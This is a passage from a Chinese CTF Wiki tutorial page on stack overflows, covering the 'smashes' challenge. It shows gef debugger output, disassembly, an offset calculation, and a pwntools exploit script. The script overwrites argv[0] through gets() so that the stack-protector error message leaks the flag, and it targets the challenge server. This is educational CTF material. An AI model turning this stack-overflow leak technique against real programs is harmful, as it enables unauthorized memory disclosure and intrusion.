<span class="err">0</span><span class="nf">x00007fffffffdb88</span><span class="err">│+</span><span class="mi">0x10</span><span class="p">:</span> <span class="mi">0x00007fffffffdc58</span>  <span class="err">→</span>  <span class="mi">0x00007fffffffe00b</span>  <span class="err">→</span>  <span class="err">&quot;/</span><span class="no">mnt</span><span class="err">/</span><span class="no">hgfs</span><span class="err">/</span><span class="no">Hack</span><span class="err">/</span><span class="no">ctf</span><span class="err">/</span><span class="no">ctf-wiki</span><span class="err">/</span><span class="no">pwn</span><span class="err">/</span><span class="no">stackoverflow</span><span class="err">/</span><span class="no">exam</span><span class="p">[...]</span><span class="err">&quot;</span>
<span class="err">0</span><span class="nf">x00007fffffffdb90</span><span class="err">│+</span><span class="mi">0x18</span><span class="p">:</span> <span class="mi">0x0000000100000000</span>
<span class="err">0</span><span class="nf">x00007fffffffdb98</span><span class="err">│+</span><span class="mi">0x20</span><span class="p">:</span> <span class="mi">0x00000000004006d0</span>  <span class="err">→</span>   <span class="no">sub</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x8</span>
<span class="err">0</span><span class="nf">x00007fffffffdba0</span><span class="err">│+</span><span class="mi">0x28</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>
<span class="err">0</span><span class="nf">x00007fffffffdba8</span><span class="err">│+</span><span class="mi">0x30</span><span class="p">:</span> <span class="mi">0x48c916d3cf726fe3</span>
<span class="err">0</span><span class="nf">x00007fffffffdbb0</span><span class="err">│+</span><span class="mi">0x38</span><span class="p">:</span> <span class="mi">0x00000000004006ee</span>  <span class="err">→</span>   <span class="no">xor</span> <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
<span class="err">──────────────────────────────────────────────────────────────[</span> <span class="nf">trace</span> <span class="p">]</span><span class="err">────</span>
<span class="err">[</span><span class="c">#0] 0x4006d0 → sub rsp, 0x8</span>
<span class="err">[</span><span class="c">#1] 0x7ffff7a2d830 → Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdc48)</span>
<span class="err">---</span><span class="nf">Type</span> <span class="err">&lt;</span><span class="no">return</span><span class="err">&gt;</span> <span class="no">to</span> <span class="no">continue</span><span class="p">,</span> <span class="no">or</span> <span class="mh">q</span> <span class="p">&lt;</span><span class="no">return</span><span class="p">&gt;</span> <span class="no">to</span> <span class="no">quit---</span>
<span class="err">[</span><span class="c">#2] 0x400717 → hlt </span>
</pre></div>

<p>可以看出0x00007fffffffe00b指向程序名，其自然就是argv[0]，所以我们修改的内容就是这个地址。同时0x00007fffffffdc58处保留着该地址，所以我们真正需要的地址是0x00007fffffffdc58。</p>
<p>此外，根据汇编代码</p>
<div class="codehilite"><pre><span></span><span class="nl">.text:</span><span class="err">00000000004007</span><span class="nf">E0</span>                 <span class="no">push</span>    <span class="no">rbp</span>
<span class="nl">.text:</span><span class="err">00000000004007</span><span class="nf">E1</span>                 <span class="no">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="no">offset</span> <span class="no">aHelloWhatSYour</span> <span class="c">; &quot;Hello!\nWhat&#39;s your name? &quot;</span>
<span class="no">.text</span><span class="p">:</span><span class="mi">00000000004007</span><span class="no">E6</span>                 <span class="no">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="mi">1</span>
<span class="nl">.text:</span><span class="err">00000000004007</span><span class="nf">EB</span>                 <span class="no">push</span>    <span class="no">rbx</span>
<span class="nl">.text:</span><span class="err">00000000004007</span><span class="nf">EC</span>                 <span class="no">sub</span>     <span class="no">rsp</span><span class="p">,</span> <span class="mi">118</span><span class="no">h</span>
<span class="nl">.text:</span><span class="err">00000000004007</span><span class="nf">F3</span>                 <span class="no">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">fs</span><span class="p">:</span><span class="mi">28</span><span class="no">h</span>
<span class="nl">.text:</span><span class="err">00000000004007</span><span class="nf">FC</span>                 <span class="no">mov</span>     <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">128</span><span class="no">h</span><span class="err">+</span><span class="no">var_20</span><span class="p">],</span> <span class="no">rax</span>
<span class="nl">.text:</span><span class="err">0000000000400804</span>                 <span class="nf">xor</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
<span class="nl">.text:</span><span class="err">0000000000400806</span>                 <span class="nf">call</span>    <span class="no">___printf_chk</span>
<span class="nl">.text:</span><span class="err">000000000040080</span><span class="nf">B</span>                 <span class="no">mov</span>     <span class="no">rdi</span><span class="p">,</span> <span class="no">rsp</span>
<span class="nl">.text:</span><span class="err">000000000040080</span><span class="nf">E</span>                 <span class="no">call</span>    <span class="no">__IO_gets</span>
</pre></div>

<p>我们可以确定我们读入的字符串的起始地址其实就是调用__IO_gets之前的rsp，所以我们把断点下在call处，如下</p>
<div class="codehilite"><pre><span></span><span class="nf">gef</span><span class="err">➤</span>  <span class="no">b</span> <span class="p">*</span><span class="mi">0x000000000040080E</span>
<span class="nf">Breakpoint</span> <span class="mi">2</span> <span class="no">at</span> <span class="mi">0x40080e</span>
<span class="nf">gef</span><span class="err">➤</span>  <span class="no">c</span>
<span class="nf">Continuing.</span>
<span class="nf">Hello</span><span class="p">!</span>
<span class="nf">What</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">your</span> <span class="no">name</span><span class="err">?</span> 
<span class="no">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0x000000000040080e</span> <span class="no">in</span> <span class="err">??</span> <span class="p">()</span>
<span class="err">──────────────────────────[</span> <span class="nl">code:i386:</span><span class="nf">x86-64</span> <span class="p">]</span><span class="err">────</span>
     <span class="err">0</span><span class="nf">x400804</span>                  <span class="no">xor</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
     <span class="err">0</span><span class="nf">x400806</span>                  <span class="no">call</span>   <span class="mh">0x4006b0</span> <span class="p">&lt;</span><span class="no">__printf_chk@plt</span><span class="p">&gt;</span>
     <span class="err">0</span><span class="nf">x40080b</span>                  <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rsp</span>
 <span class="err">→</span>   <span class="err">0</span><span class="nf">x40080e</span>                  <span class="no">call</span>   <span class="mh">0x4006c0</span> <span class="p">&lt;</span><span class="no">_IO_gets@plt</span><span class="p">&gt;</span>
   <span class="err">↳</span>    <span class="err">0</span><span class="nf">x4006c0</span> <span class="err">&lt;</span><span class="no">_IO_gets@plt</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">jmp</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x20062a</span><span class="p">]</span>        <span class="c"># 0x600cf0 &lt;_IO_gets@got.plt&gt;</span>
        <span class="mh">0x4006c6</span> <span class="p">&lt;</span><span class="no">_IO_gets@plt</span><span class="p">+</span><span class="mi">6</span><span class="p">&gt;</span> <span class="no">push</span>   <span class="mi">0x9</span>
        <span class="err">0</span><span class="nf">x4006cb</span> <span class="err">&lt;</span><span class="no">_IO_gets@plt</span><span class="err">+</span><span class="mi">11</span><span class="err">&gt;</span> <span class="no">jmp</span>    <span class="mi">0x400620</span>
        <span class="err">0</span><span class="nf">x4006d0</span>                  <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x8</span>
<span class="err">──────────────────[</span> <span class="nf">stack</span> <span class="p">]</span><span class="err">────</span>
<span class="err">[&#39;0</span><span class="nf">x7fffffffda40</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="no">l8</span><span class="err">&#39;</span><span class="p">]</span>
<span class="err">8</span>
<span class="err">0</span><span class="nf">x00007fffffffda40</span><span class="err">│+</span><span class="mi">0x00</span><span class="p">:</span> <span class="mi">0x0000ff0000000000</span>     <span class="err">←</span> <span class="no">$rsp</span><span class="p">,</span> <span class="no">$rdi</span>
<span class="err">0</span><span class="nf">x00007fffffffda48</span><span class="err">│+</span><span class="mi">0x08</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>
<span class="err">0</span><span class="nf">x00007fffffffda50</span><span class="err">│+</span><span class="mi">0x10</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>
<span class="err">0</span><span class="nf">x00007fffffffda58</span><span class="err">│+</span><span class="mi">0x18</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>
<span class="err">0</span><span class="nf">x00007fffffffda60</span><span class="err">│+</span><span class="mi">0x20</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>
<span class="err">0</span><span class="nf">x00007fffffffda68</span><span class="err">│+</span><span class="mi">0x28</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>
<span class="err">0</span><span class="nf">x00007fffffffda70</span><span class="err">│+</span><span class="mi">0x30</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>
<span class="err">0</span><span class="nf">x00007fffffffda78</span><span class="err">│+</span><span class="mi">0x38</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>
<span class="err">───────────────────────────────────────────────────────────────────────────────────────────────────[</span> <span class="nf">trace</span> <span class="p">]</span><span class="err">────</span>
<span class="err">[</span><span class="c">#0] 0x40080e → call 0x4006c0 &lt;_IO_gets@plt&gt;</span>
<span class="err">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
<span class="nf">gef</span><span class="err">➤</span>  <span class="no">print</span> <span class="no">$rsp</span>
<span class="nf">$1</span> <span class="err">=</span> <span class="p">(</span><span class="no">void</span> <span class="p">*)</span> <span class="mi">0x7fffffffda40</span>
</pre></div>

<p>可以看出rsp的值为0x7fffffffda40，那么相对偏移为</p>
<div class="codehilite"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="mh">0x00007fffffffdc58</span><span class="o">-</span><span class="mh">0x7fffffffda40</span>
<span class="mi">536</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="mi">536</span><span class="p">)</span>
<span class="s1">&#39;0x218&#39;</span>
</pre></div>

<h4 id="_13">利用程序<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h4>
<p>我们构造利用程序如下</p>
<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
<span class="n">smash</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./smashes&#39;</span><span class="p">)</span>
<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.jarvisoj.com&#39;</span><span class="p">,</span> <span class="mi">9877</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./smashes&#39;</span><span class="p">)</span>
<span class="n">argv_addr</span> <span class="o">=</span> <span class="mh">0x00007fffffffdc58</span>
<span class="n">name_addr</span> <span class="o">=</span> <span class="mh">0x7fffffffda40</span>
<span class="n">flag_addr</span> <span class="o">=</span> <span class="mh">0x600D20</span>
<span class="n">another_flag_addr</span> <span class="o">=</span> <span class="mh">0x400d20</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="n">argv_addr</span> <span class="o">-</span> <span class="n">name_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">another_flag_addr</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;name? &#39;</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;flag: &#39;</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;bb&#39;</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>

<p>这里我们直接就得到了flag，没有出现网上说的得不到flag的情况。</p>
<h3 id="_14">题目<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
                
                  
                
              
              
                
              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../basic_rop/" title="基本 ROP" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  后退
                </span>
                基本 ROP
              </span>
            </div>
          </a>
        
        
          <a href="../medium_rop/" title="中级 ROP" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  前进
                </span>
                中级 ROP
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="http://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
        
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../assets/javascripts/application.02434462.js"></script>
      
        
        
          
          <script src="../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
          
            
              
                <script src="../../../assets/javascripts/lunr/tinyseg.js"></script>
              
              
                <script src="../../../assets/javascripts/lunr/lunr.jp.js"></script>
              
            
          
          
        
      
      <script>app.initialize({version:"0.17.2",url:{base:"../../.."}})</script>
      
        <script src="../../../_static/js/extra.js"></script>
      
        <script src="https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
      
    
    
      
    
  </body>
</html>